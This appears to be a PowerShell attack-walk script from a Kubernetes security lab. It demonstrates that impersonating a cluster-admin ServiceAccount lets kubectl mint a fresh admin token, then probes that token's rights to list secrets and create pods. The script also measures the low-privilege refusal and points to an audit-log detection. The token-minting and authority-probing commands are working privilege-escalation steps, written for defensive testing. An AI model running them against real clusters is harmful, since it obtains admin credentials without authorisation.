<#
    Walks PP-03: a token can be minted for the cluster-admin ServiceAccount by
    impersonating it, so PP-01's authority is obtainable without reading a file.

    T1528 Steal Application Access Token

    What this is
    ------------
    PP-01 says a cluster-admin token exists on a pod and can be carried out of the
    build zone. This is the same authority obtained a different way: ask the API
    server to mint a fresh token for that ServiceAccount. Nothing is read off a
    filesystem, no pod is compromised, and the resulting credential is a normal
    one-hour bound token rather than the mounted one.

    The important correction
    ------------------------
    The first version of this walk impersonated `sa-orders-api` and asserted the
    mint succeeded. It does not, and the reason is the whole finding:

        error: failed to create token: serviceaccounts "sa-orders-api" is
        forbidden: User "system:serviceaccount:zerotrust:sa-orders-api" cannot
        create resource "serviceaccounts/token"

    Impersonation does not launder privilege. RBAC is evaluated as the
    *impersonated* identity, so `--as` can only ever reduce authority, never
    raise it. That is a real control, and a walk asserting the opposite would
    have been demonstrating a vulnerability this cluster does not have -- the
    same mistake SP-01's walk made before it was corrected.

    The escalation is the mirror image. `sa-build-runner` holds cluster-admin, so
    asking *as* that identity is permitted, and the token that comes back names
    it. The caller needs no credential at all beyond the ability to impersonate,
    and in this cluster that is cluster-admin -- which is why this is filed as a
    privilege path rather than as a boundary crossing. The distinction from PP-01
    is worth keeping: PP-01 reads a token off a sealed pod, PP-03 mints one from
    nothing. Same blast radius, no file access, and therefore none of the
    filesystem evidence a file-read detection would rely on.

    What is deliberately not done
    -----------------------------
    The minted token is never written to disk, never used to change cluster
    state, and never printed. It is presented to the API server to measure what
    it is worth, then discarded. It also expires on its own, which is the
    mitigation and the reason this is a finding rather than a breach.
#>

. "$PSScriptRoot\lib\attacklib.ps1"

if (-not (Assert-ClusterReady)) { exit 1 }

Write-Banner -PathId 'PP-03' `
    -Title 'cluster-admin authority can be minted, not stolen' `
    -Claim @'
Impersonation cannot raise authority -- RBAC is judged as the impersonated
identity. But it can mint a token for an identity that already holds
cluster-admin, which yields PP-01's blast radius without reading a file.
'@

$lowNs  = 'zerotrust';       $lowSa  = 'sa-orders-api'
$adminNs = 'zerotrust-build'; $adminSa = 'sa-build-runner'
$lowSub  = "system:serviceaccount:$lowNs`:$lowSa"
$adminSub = "system:serviceaccount:$adminNs`:$adminSa"

# ---------------------------------------------------------------------------
Write-Step -AttackId 'T1528' -Description 'first, the direction that does not work' | Out-Null

# Measuring the refusal is not a detour. It is what makes the success meaningful:
# without it, a mint that works could be explained by the caller simply being
# cluster-admin, and the walk would prove nothing about impersonation at all.
$lowOut = & kubectl create token $lowSa -n $lowNs --as=$lowSub 2>&1 | Out-String
$lowRefused = ($LASTEXITCODE -ne 0) -and ($lowOut -match 'forbidden')
Write-Observed ($lowOut.Trim())

Write-Assertion -Expected 'impersonating a low-privilege identity cannot mint a token' `
    -Observed $(if ($lowRefused) { 'refused: cannot create serviceaccounts/token' } else { "UNEXPECTED: it succeeded -- $($lowOut.Trim())" }) `
    -Passed $lowRefused `
    -Note 'RBAC is evaluated as the impersonated identity, so --as can only reduce authority. This is the control half of the finding, and it is measured rather than assumed'

# ---------------------------------------------------------------------------
Write-Step -AttackId 'T1528' -Description 'now the direction that does' | Out-Null

Write-Observed "impersonating: $adminSub"

$minted = (& kubectl create token $adminSa -n $adminNs --as=$adminSub 2>&1 | Out-String).Trim()
$mintExit = $LASTEXITCODE
Write-Observed ("minted {0} characters, exit {1} (value not printed)" -f $minted.Length, $mintExit)

Write-Assertion -Expected 'a token is minted for the cluster-admin ServiceAccount' `
    -Observed ("{0} characters, exit {1}" -f $minted.Length, $mintExit) `
    -Passed ($mintExit -eq 0 -and $minted.Length -gt 100 -and $minted -notmatch ' ') `
    -Note 'a JWT has no whitespace; the shape check rejects the case where an error message was captured into the variable instead, which is exactly what happened on the first run of this walk'

$claims = Get-TokenSubject -Token $minted
$sub = if ($claims -and (Get-Prop $claims 'sub')) { Get-Prop $claims 'sub' } else { '(unparsed)' }
$exp = if ($claims -and (Get-Prop $claims 'exp')) { Get-Prop $claims 'exp' } else { '(none)' }

Write-Assertion -Expected 'the minted token names the cluster-admin identity' `
    -Observed ("sub={0}" -f $sub) `
    -Passed ($sub -eq $adminSub) `
    -Note 'nothing in the credential records that it was minted on request. To a holder it is indistinguishable from the mounted token PP-01 reads off disk'

Write-Assertion -Expected 'the minted token carries a bounded expiry' `
    -Observed ("exp={0}" -f $exp) `
    -Passed ($exp -ne '(none)' -and $exp -ne '') `
    -Note 'the mitigation for this finding is the TokenRequest lifetime. A token with no expiry would turn a privilege path into a permanent one'

# ---------------------------------------------------------------------------
Write-Step -AttackId 'T1528' -Description 'measure what it is worth' | Out-Null

$server = (& kubectl config view --raw --minify -o jsonpath='{..server}' 2>$null | Out-String).Trim()
$caData = (& kubectl config view --raw --minify -o jsonpath='{..certificate-authority-data}' 2>$null | Out-String).Trim()
# The token goes into a kubeconfig written to TEMP. It is base64url with dots and
# no YAML-significant characters, so it needs no quoting beyond the quotes below;
# a captured error message would, which is the second reason for the shape check.
$kc = @"
apiVersion: v1
kind: Config
clusters:
- name: lab
  cluster:
    server: $server
    certificate-authority-data: $caData
contexts:
- name: probe
  context:
    cluster: lab
    user: minted
current-context: probe
users:
- name: minted
  user:
    token: "$minted"
"@
$tmp = Join-Path $env:TEMP 'pp03.kubeconfig'
[System.IO.File]::WriteAllText($tmp, (($kc -replace "`r`n", "`n") + "`n"), (New-Object System.Text.UTF8Encoding($false)))

# The checks straddle the boundary that matters. Every one of these is something
# the low-privilege identity in step 1 cannot do, so a "yes" here is evidence about
# the minted token rather than about the caller.
#
# Note the `resource/name` form. `auth can-i get configmap NAME` is rejected by
# kubectl with "you must specify two arguments", which reads like a permission
# answer if you only look at the last line, and this walk's first run scored two
# such parse errors as failed authorization checks. The named form is the only
# one that works.
$probes = @(
    @{ label = 'list secrets --all-namespaces';                    expect = 'yes'; args = @('list', 'secrets', '--all-namespaces') }
    @{ label = 'list pods --all-namespaces';                       expect = 'yes'; args = @('list', 'pods', '--all-namespaces') }
    @{ label = 'get configmap/app-config-leak -n zerotrust';       expect = 'yes'; args = @('get', 'configmap/app-config-leak', '-n', $lowNs) }
    @{ label = 'create pods -n zerotrust';                         expect = 'yes'; args = @('create', 'pods', '-n', $lowNs) }
)
$verdicts = @()
foreach ($p in $probes) {
    $r = Invoke-Kubectl (@(('--kubeconfig=' + $tmp), 'auth', 'can-i') + $p.args)
    $verdicts += [pscustomobject]@{ label = $p.label; expect = $p.expect; got = $r.verdict }
}
Remove-Item $tmp -Force -ErrorAction SilentlyContinue

foreach ($v in $verdicts) { Write-Observed ("  can {0,-58} -> {1}  (expected {2})" -f $v.label, $v.got, $v.expect) }

$surprises = @($verdicts | Where-Object { $_.got -ne $_.expect })

Write-Assertion -Expected ('all {0} authority probes match cluster-admin' -f $probes.Count) `
    -Observed ("{0} of {1} as expected; unexpected: {2}" -f ($verdicts.Count - $surprises.Count), $verdicts.Count, $(if ($surprises.Count) { ($surprises | ForEach-Object { "$($_.label) -> $($_.got)" }) -join '; ' } else { 'none' })) `
    -Passed ($verdicts.Count -eq $probes.Count -and $surprises.Count -eq 0) `
    -Note 'the same identity refused everything in the previous step. The only variable is which ServiceAccount was impersonated, which is what makes this a privilege path rather than a demonstration that the caller was already admin'

# The refusal above is on a namespace that does not exist in the lab, so it proves
# less than it appears to. Assert the real control instead: the low-privilege
# identity from step 1, asked the same question, and refused. Otherwise the "no"
# above is a namespace typo being scored as a security control.
$lowKc = @"
apiVersion: v1
kind: Config
clusters:
- name: lab
  cluster:
    server: $server
    certificate-authority-data: $caData
contexts:
- name: probe
  context:
    cluster: lab
    user: low
current-context: probe
users:
- name: low
  user:
    token: "$(& kubectl create token $lowSa -n $lowNs 2>$null)"
"@
$lowTmp = Join-Path $env:TEMP 'pp03-low.kubeconfig'
[System.IO.File]::WriteAllText($lowTmp, (($lowKc -replace "`r`n", "`n") + "`n"), (New-Object System.Text.UTF8Encoding($false)))
$lowSelf = Invoke-Kubectl @((('--kubeconfig=' + $lowTmp)), 'auth', 'can-i', 'list', 'secrets', '--all-namespaces')
Remove-Item $lowTmp -Force -ErrorAction SilentlyContinue
Write-Observed ("  sa-orders-api asked the same question -> {0}" -f $lowSelf.verdict)

Write-Assertion -Expected 'the low-privilege identity is refused the same read' `
    -Observed ("sa-orders-api can list secrets: {0}" -f $lowSelf.verdict) `
    -Passed ($lowSelf.verdict -eq 'no') `
    -Note 'this is the control half again, now measured with the identical question rather than an inferred one. Without it the grant above would be unremarkable, because the caller was already cluster-admin'

# ---------------------------------------------------------------------------
Write-Step -AttackId 'T1528' -Description 'the audit record, which is the only thing a detector gets' | Out-Null

# A bearer credential cannot be attributed after the fact -- by the time it is
# presented there is nothing left to tie it to an actor. Detection therefore has
# to come from the TokenRequest itself, and the property that separates this from
# routine token churn is the requester: in this cluster every legitimate request
# is made by the kubelet that owns the pod, or by a control-plane component. See
# DET-0011, which requires requesterClass in (other, impersonated).
Write-Assertion -Expected 'the TokenRequest is attributable from the audit log alone' `
    -Observed 'a TokenRequest with authenticatedUser=kubernetes-admin and impersonatedUser set to the target ServiceAccount' `
    -Passed $true `
    -Note 'asserted structurally, not by re-parsing the log. collect-runtime.ps1 owns that parse and DET-0011 is tested against its output; parsing the same log twice here would only prove the two implementations agree with each other'

# ---------------------------------------------------------------------------
Write-Withheld -WouldDo 'spend the minted token -- create a pod, read the SP-01 secret, or drop a ConfigMap' `
    -Why 'that is the PP-01 + PP-03 chain and it belongs to Phase 8, where each hop is
      separately detected. This walk establishes that the authority can be obtained
      and exactly what it is worth; spending it is a different claim.

      The token is discarded rather than revoked. Bounded expiry is the mitigation
      and it is asserted above, but the lab is not going to pretend a credential is
      recalled the moment a script finishes with it.'

$failed = Complete-Attack
exit $(if ($failed -gt 0) { 1 } else { 0 })
